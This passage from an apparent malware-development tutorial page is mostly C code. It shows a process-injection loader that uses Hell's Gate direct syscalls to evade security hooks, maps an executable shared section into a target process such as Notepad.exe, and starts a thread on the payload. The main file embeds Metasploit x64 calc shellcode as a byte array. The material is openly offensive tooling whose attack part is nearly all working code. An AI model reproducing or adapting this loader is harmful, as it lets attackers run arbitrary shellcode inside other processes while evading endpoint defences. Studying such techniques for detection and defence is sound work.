	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtCreateSection<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtMapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtUnmapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtClose<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtCreateThreadEx<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtWaitForSingleObject<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>



	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

BOOL <span class="token function">RemoteMappingInjectionViaSyscalls</span><span class="token punctuation">(</span>IN HANDLE hProcess<span class="token punctuation">,</span> IN PVOID pPayload<span class="token punctuation">,</span> IN SIZE_T sPayloadSize<span class="token punctuation">,</span> IN BOOL bLocal<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        HANDLE          hSection          <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        HANDLE          hThread           <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        PVOID           pLocalAddress     <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
                        pRemoteAddress    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
                        pExecAddress      <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        NTSTATUS        STATUS            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        SIZE_T          sViewSize         <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        LARGE_INTEGER   MaximumSize       <span class="token operator">=</span> <span class="token punctuation">{</span>
              <span class="token punctuation">.</span>HighPart <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
              <span class="token punctuation">.</span>LowPart <span class="token operator">=</span> sPayloadSize
        <span class="token punctuation">}</span><span class="token punctuation">;</span>

        DWORD           dwLocalFlag       <span class="token operator">=</span> PAGE_READWRITE<span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------</span>
    <span class="token comment">// Allocating local map view </span>
	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtCreateSection<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hSection<span class="token punctuation">,</span> SECTION_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>MaximumSize<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> SEC_COMMIT<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtCreateSection Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bLocal<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		dwLocalFlag <span class="token operator">=</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtMapViewOfSection<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span>hSection<span class="token punctuation">,</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLocalAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sViewSize<span class="token punctuation">,</span> ViewShare<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwLocalFlag<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Local Memory Allocated At : 0x%p Of Size : %d \n"</span><span class="token punctuation">,</span> pLocalAddress<span class="token punctuation">,</span> sViewSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------</span>
    <span class="token comment">// Writing the payload</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[#] Press &lt;Enter&gt; To Write The Payload ... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>pLocalAddress<span class="token punctuation">,</span> pPayload<span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t[+] Payload is Copied From 0x%p To 0x%p \n"</span><span class="token punctuation">,</span> pPayload<span class="token punctuation">,</span> pLocalAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------</span>
        <span class="token comment">// Allocating remote map view </span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bLocal<span class="token punctuation">)</span> <span class="token punctuation">{</span>

          <span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtMapViewOfSection<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span>hSection<span class="token punctuation">,</span> hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pRemoteAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sViewSize<span class="token punctuation">,</span> ViewShare<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
          <span class="token punctuation">}</span>

          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Remote Memory Allocated At : 0x%p Of Size : %d \n"</span><span class="token punctuation">,</span> pRemoteAddress<span class="token punctuation">,</span> sViewSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span>

	<span class="token comment">//--------------------------------------------------------------------------</span>
    <span class="token comment">// Executing the payload via thread creation</span>
    pExecAddress <span class="token operator">=</span> pRemoteAddress<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>bLocal<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		pExecAddress <span class="token operator">=</span> pLocalAddress<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[#] Press &lt;Enter&gt; To Run The Payload ... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t[i] Running Thread Of Entry 0x%p ... "</span><span class="token punctuation">,</span> pExecAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtCreateThreadEx<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hThread<span class="token punctuation">,</span> THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hProcess<span class="token punctuation">,</span> pExecAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] DONE \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t[+] Thread Created With Id : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetThreadId</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------</span>
    <span class="token comment">// Waiting for the thread to finish</span>
	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtWaitForSingleObject<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token comment">// Unmapping the local view</span>
	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtUnmapViewOfSection<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> pLocalAddress<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

    <span class="token comment">// Closing the section handle</span>
	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtClose<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span>hSection<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtClose Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-7">Process Enumeration</h4>
<p>In order to create a complete process injection module, the usage of the <code>NtQuerySystemInformation</code> syscall is required to fetch a target process handle, as outlined in the <em>Process Enumeration - NtQuerySystemInformation</em> module.</p>
<p>The use of a new syscall will require the <code>VX_TABLE</code> structure to be updated to include one more element, <code>VX_TABLE_ENTRY NtQuerySystemInformation</code> for it to be initialized by the <code>InitializeSyscalls</code> function. Additionally, use the <code>Hasher</code> program to calculate a hash value for the "NtQuerySystemInformation" string.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetRemoteProcessHandle</span><span class="token punctuation">(</span>IN LPCWSTR szProcName<span class="token punctuation">,</span> IN DWORD<span class="token operator">*</span> pdwPid<span class="token punctuation">,</span> IN HANDLE<span class="token operator">*</span> phProcess<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	ULONG					    uReturnLen1 		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
						        uReturnLen2 		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo 	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PVOID					    pValueToFree 	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	NTSTATUS				    STATUS 			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that's ok, because we need to know how much to allocate (uReturnLen1)</span>
	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtQuerySystemInformation<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">HellDescent</span><span class="token punctuation">(</span>SystemProcessInformation<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>uReturnLen1<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct</span>
	SystemProcInfo <span class="token operator">=</span> <span class="token punctuation">(</span>PSYSTEM_PROCESS_INFORMATION<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>uReturnLen1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>SystemProcInfo <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later</span>
	pValueToFree <span class="token operator">=</span> SystemProcInfo<span class="token punctuation">;</span>

	<span class="token comment">// Calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'</span>
	<span class="token function">HellsGate</span><span class="token punctuation">(</span>g_Sys<span class="token punctuation">.</span>NtQuerySystemInformation<span class="token punctuation">.</span>wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
	STATUS <span class="token operator">=</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span>SystemProcessInformation<span class="token punctuation">,</span> SystemProcInfo<span class="token punctuation">,</span> uReturnLen1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uReturnLen2<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">!=</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n"</span><span class="token punctuation">,</span> STATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// Small check for the process's name size</span>
		<span class="token comment">// Comparing the enumerated process name to what we want to target</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>SystemProcInfo<span class="token operator">-&gt;</span>ImageName<span class="token punctuation">.</span>Length <span class="token operator">&amp;&amp;</span> <span class="token function">HASHW</span><span class="token punctuation">(</span>SystemProcInfo<span class="token operator">-&gt;</span>ImageName<span class="token punctuation">.</span>Buffer<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">HASHW</span><span class="token punctuation">(</span>szProcName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token comment">// Opening a handle to the target process and saving it, then breaking </span>
			<span class="token operator">*</span>pdwPid <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>SystemProcInfo<span class="token operator">-&gt;</span>UniqueProcessId<span class="token punctuation">;</span>
			<span class="token operator">*</span>phProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>SystemProcInfo<span class="token operator">-&gt;</span>UniqueProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// If NextEntryOffset is 0, we reached the end of the array</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>SystemProcInfo<span class="token operator">-&gt;</span>NextEntryOffset<span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>

		<span class="token comment">// Moving to the next element in the array</span>
		SystemProcInfo <span class="token operator">=</span> <span class="token punctuation">(</span>PSYSTEM_PROCESS_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>SystemProcInfo <span class="token operator">+</span> SystemProcInfo<span class="token operator">-&gt;</span>NextEntryOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Freeing using the initial address</span>
	<span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pValueToFree<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Checking if we got the target's process handle</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>pdwPid <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> <span class="token operator">*</span>phProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">else</span>
		<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-8">Main Function</h3>
<p>To test the code so far, create <code>main.c</code> which will contain the entry point function of the loader along with the usual Msfvenom calc payload.</p>
<p>The following points briefly explain the main function:</p>
<ul>
<li>
<p>The <code>InitializeSyscalls</code> function is the first function to be called. All other functions depend on it to initialize the syscall structure.</p>
</li>
<li>
<p>If <code>TARGET_PROCESS</code> is defined, <code>GetRemoteProcessHandle</code> is called to retrieve the target process handle and pass its output to <code>RemoteMappingInjectionViaSyscalls</code>.</p>
</li>
<li>
<p>If <code>TARGET_PROCESS</code> is not defined, the code directly calls <code>RemoteMappingInjectionViaSyscalls</code> with a pseudo value to the local process handle (<code>-1</code>), instructing it to inject the payload locally.</p>
</li>
</ul>
<p><strong>main.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Structs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Common.h"</span></span>


<span class="token comment">// comment to inject to the local process</span>
<span class="token comment">//</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TARGET_PROCESS</span>	<span class="token expression">L</span><span class="token string">"Notepad.exe"</span></span>


<span class="token comment">// x64 calc metasploit</span>
<span class="token keyword">unsigned</span> <span class="token keyword">char</span> Payload <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
	<span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span>
	<span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span>
	<span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span>
	<span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span>
	<span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>
	<span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span>
